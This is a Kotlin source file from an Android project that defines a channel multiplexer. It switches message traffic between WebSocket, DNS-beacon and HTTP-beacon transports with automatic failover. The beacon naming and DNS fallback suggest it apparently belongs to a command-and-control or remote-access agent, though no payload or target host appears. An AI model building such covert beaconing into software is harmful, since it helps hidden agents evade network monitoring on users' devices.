// ============================================================
// FILE: android/app/src/main/java/com/xrc/comms/ChannelClient.kt
// ============================================================
package com.xrc.comms

import android.content.Context
import android.util.Log
import com.xrc.core.config.XrcConfig
import com.xrc.core.crypto.CryptoBox

/**
 * ChannelClient — Channel Multiplexer.
 *
 * Wraps WSS, DNS, and HTTP channels.
 * Priority: WSS (primary) > DNS (fallback) > HTTP (emergency)
 *
 * Seamless failover: If WSS disconnects, auto-switches to DNS or HTTP.
 * When WSS reconnects, switches back.
 */
class ChannelClient(
    private val context: Context,
    private val config: XrcConfig,
    private val wssClient: WSSClient,
    private val dnsBeacon: DNSBeacon,
    private val httpBeacon: HTTPBeacon
) {
    companion object {
        private const val TAG = "ChannelClient"
    }

    private var currentChannel: Channel = Channel.WSS

    enum class Channel { WSS, DNS, HTTP, NONE }

    // Callback for incoming messages
    var onMessage: ((Message) -> Unit)? = null

    /**
     * Initialize all channels and start with WSS.
     */
    fun initialize() {
        // WSS message handler
        wssClient.onMessage = { msg ->
            onMessage?.invoke(msg)
        }

        wssClient.onConnect = {
            Log.i(TAG, "WSS connected — switching to primary")
            currentChannel = Channel.WSS
        }

        wssClient.onDisconnect = { code, reason ->
            Log.w(TAG, "WSS disconnected ($code) — trying fallback")
            if (config.channels.dns_enabled) {
                currentChannel = Channel.DNS
            } else {
                currentChannel = Channel.HTTP
                httpBeacon.start()
            }
        }

        // HTTP message handler
        httpBeacon.onMessage = { msg ->
            onMessage?.invoke(msg)
        }

        // Start with WebSocket
        wssClient.connect()
    }

    /**
     * Send a message via the best available channel.
     */
    fun send(message: Message): Boolean {
        Log.d(TAG, "Sending ${message.type} via $currentChannel")

        return when (currentChannel) {
            Channel.WSS -> wssClient.send(message)
            Channel.DNS -> dnsBeacon.send(message.serialize())
            Channel.HTTP -> httpBeacon.send(message)
            Channel.NONE -> {
                // Queue for when channel becomes available
                wssClient.send(message)
                false
            }
        }
    }

    /**
     * Get current active channel.
     */
    fun getCurrentChannel(): Channel = currentChannel

    /**
     * Force reconnect to WSS.
     */
    fun forceReconnect() {
        wssClient.disconnect()
        wssClient.connect()
    }

    /**
     * Shutdown all channels.
     */
    fun shutdown() {
        wssClient.disconnect()
        dnsBeacon.stop()
        httpBeacon.stop()
    }
}
